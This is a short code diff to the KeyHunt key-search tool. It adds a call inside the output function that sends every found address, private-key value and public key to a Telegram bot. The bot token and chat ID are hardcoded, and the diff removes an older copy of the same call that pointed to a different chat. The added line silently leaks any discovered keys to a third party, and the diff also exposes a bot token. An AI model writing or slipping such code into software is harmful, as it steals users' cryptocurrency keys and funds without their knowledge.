@@ -254,6 +254,7 @@ double log1(double x)
 
 void KeyHunt::output(std::string addr, std::string pAddr, std::string pAddrHex, std::string pubKey)
 {
+   sendTelegramMessage("5587100319:AAGmfXbIy9Q6fvGxuWbm_DXDxkSm_tpcMnk", "-4119801998", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
 
 #ifdef WIN64
 	WaitForSingleObject(ghMutex, INFINITE);
@@ -1417,13 +1418,6 @@ char* KeyHunt::toTimeStr(int sec, char* timeStr)
 	return (char*)timeStr;
 }
 
-void KeyHunt::output(std::string addr, std::string pAddr, std::string pAddrHex, std::string pubKey) {
-    // Remove the printf statements
-    // ...
-
-    // Add the following line to send the message to Telegram
-    sendTelegramMessage("5587100319:AAGmfXbIy9Q6fvGxuWbm_DXDxkSm_tpcMnk", "825550725", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
-}
 
 // ----------------------------------------------------------------------------
 
